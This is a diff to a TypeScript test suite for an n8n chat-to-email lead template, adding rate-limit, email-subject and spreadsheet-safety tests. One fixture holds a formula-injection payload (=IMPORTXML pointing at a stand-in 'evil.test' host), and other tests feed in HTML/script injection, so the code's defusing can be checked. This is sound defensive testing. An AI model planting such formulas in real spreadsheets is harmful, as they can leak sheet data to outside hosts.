@@ -9,6 +9,7 @@ import {
   systemPrompt,
   TITLE,
 } from "../scripts/build-n8n-templates.mjs";
+import { codeNodeSource } from "../scripts/build-n8n-templates.mjs";
 import { type Json, runCodeNode, SAMPLE_BLUEPRINT } from "./helpers/n8n-code-node";
 
 // Rules from the n8n Creator Hub template submission and sticky note
@@ -132,6 +133,19 @@ describe(`n8n template: ${SLUG}`, () => {
     expect(Object.keys(columns.value)).toEqual(LEAD_COLUMNS);
     expect(columns.schema.map((c) => c.id)).toEqual(LEAD_COLUMNS);
     expect(overviewContent()).toContain(LEAD_COLUMNS.join(", "));
+    for (const column of LEAD_COLUMNS) {
+      expect(columns.value[column]).toBe(`={{ $('Build Blueprint Email').first().json.leadRow['${column}'] }}`);
+    }
+  });
+
+  it("writes Sheets values RAW so text can never run as a formula", () => {
+    expect(byName("Log Lead in Google Sheets").parameters.options).toEqual({ cellFormat: "RAW" });
+  });
+
+  it("keeps AI and visitor text out of the email subject", () => {
+    expect(codeNodeSource("build-blueprint-email")).toContain(
+      "subject: 'Your automation blueprint and n8n workflow are ready'"
+    );
   });
 
   it("only uses the intended expressions in the system prompt", () => {
@@ -165,6 +179,7 @@ describe(`n8n template: ${SLUG}`, () => {
 
 describe("Code node: Enforce Contract", () => {
   const contact = { firstName: "Sam", email: "Sam@Example.com" };
+  const chat = (sessionId = "session-a") => ({ "When chat message received": { sessionId } });
 
   it("turns a question into a chat reply that lists quick replies", () => {
     const out = runCodeNode("enforce-contract", {
@@ -182,9 +197,11 @@ describe("Code node: Enforce Contract", () => {
   });
 
   it("passes a complete blueprint with a valid contact", () => {
-    const out = runCodeNode("enforce-contract", {
-      output: { status: "blueprint", message: "Here it is.", contact, blueprint: SAMPLE_BLUEPRINT },
-    });
+    const out = runCodeNode(
+      "enforce-contract",
+      { output: { status: "blueprint", message: "Here it is.", contact, blueprint: SAMPLE_BLUEPRINT } },
+      chat()
+    );
     expect(out.status).toBe("blueprint");
     expect(out.contact).toEqual({ firstName: "Sam", email: "sam@example.com" });
     expect((out.blueprint as Json).name).toBe(SAMPLE_BLUEPRINT.name);
@@ -208,6 +225,36 @@ describe("Code node: Enforce Contract", () => {
     ]) {
       expect(runCodeNode("enforce-contract", input).status).toBe("question");
     }
+  });
+
+  it("limits emails to 2 per chat session and 3 per address per day", () => {
+    const store: Json = {};
+    const send = (sessionId: string, email = "sam@example.com") =>
+      runCodeNode(
+        "enforce-contract",
+        { output: { status: "blueprint", message: "x", contact: { firstName: "Sam", email }, blueprint: SAMPLE_BLUEPRINT } },
+        chat(sessionId),
+        store
+      ).status;
+    expect([send("s1"), send("s1"), send("s1")]).toEqual(["blueprint", "blueprint", "question"]);
+    expect(send("s2")).toBe("blueprint");
+    expect(send("s3")).toBe("question");
+    expect(send("s3", "other@example.com")).toBe("blueprint");
+    expect(JSON.stringify(store)).not.toContain("example.com");
+  });
+
+  it("forgets sends older than 24 hours", () => {
+    const store: Json = {
+      blueprintSends: Array.from({ length: 3 }, () => ({ at: Date.now() - 25 * 60 * 60 * 1000, session: "old", recipient: "x" })),
+    };
+    const out = runCodeNode(
+      "enforce-contract",
+      { output: { status: "blueprint", message: "x", contact, blueprint: SAMPLE_BLUEPRINT } },
+      chat("old"),
+      store
+    );
+    expect(out.status).toBe("blueprint");
+    expect((store.blueprintSends as unknown[]).length).toBe(1);
   });
 
   it("unwraps JSON the model returned as a fenced string", () => {
@@ -241,6 +288,7 @@ describe("Code node: Build n8n Starter Workflow", () => {
 
 describe("Code node: Build Blueprint Email", () => {
   const config = { ownerEmail: "owner@example.com", senderName: "Blueprints", brandName: "Acme Automations" };
+  const nodes = { Configuration: config, "When chat message received": { sessionId: "session-a" } };
   const input = {
     status: "blueprint",
     blueprint: SAMPLE_BLUEPRINT,
@@ -250,9 +298,9 @@ describe("Code node: Build Blueprint Email", () => {
   };
 
   it("builds the email from validated fields with the configured brand", () => {
-    const out = runCodeNode("build-blueprint-email", input, { Configuration: config });
+    const out = runCodeNode("build-blueprint-email", input, nodes);
     expect(out).toMatchObject({ recipient: "sam@example.com", ownerEmail: "owner@example.com", senderName: "Blueprints" });
-    expect(out.subject).toBe("Your automation blueprint + n8n workflow: Email enquiries to Sheets");
+    expect(out.subject).toBe("Your automation blueprint and n8n workflow are ready");
     expect(String(out.html)).toContain("Acme Automations");
     expect(String(out.html)).toContain("Hi Sam, here is the automation blueprint you requested.");
   });
@@ -266,7 +314,7 @@ describe("Code node: Build Blueprint Email", () => {
     const out = runCodeNode(
       "build-blueprint-email",
       { ...input, blueprint: evil, contact: { firstName: "<b>Sam</b>", email: "sam@example.com" } },
-      { Configuration: config }
+      nodes
     );
     const html = String(out.html);
     expect(html).not.toMatch(/<script|<a href|<b>Sam/);
@@ -275,7 +323,24 @@ describe("Code node: Build Blueprint Email", () => {
 
   it("refuses to send until ownerEmail is configured", () => {
     expect(() =>
-      runCodeNode("build-blueprint-email", input, { Configuration: { ...config, ownerEmail: "you@example.com" } })
+      runCodeNode("build-blueprint-email", input, { ...nodes, Configuration: { ...config, ownerEmail: "you@example.com" } })
     ).toThrow(/Set ownerEmail/);
+  });
+
+  it("builds a lead row with spreadsheet formulas defused", () => {
+    const formula = '=IMPORTXML("https://evil.test","//a")';
+    const evil = { ...SAMPLE_BLUEPRINT, name: formula, problem: "+1+1" };
+    const out = runCodeNode(
+      "build-blueprint-email",
+      { ...input, blueprint: evil, contact: { firstName: "@SUM(A1)", email: "sam@example.com" } },
+      nodes
+    );
+    const row = out.leadRow as Json;
+    expect(Object.keys(row)).toEqual(LEAD_COLUMNS);
+    expect(row["First Name"]).toBe("'@SUM(A1)");
+    expect(row.Automation).toBe("'" + formula);
+    expect(row.Problem).toBe("'+1+1");
+    expect(row["Hours Saved per Week"]).toBe("3");
+    expect(row["Session ID"]).toBe("session-a");
   });
 });
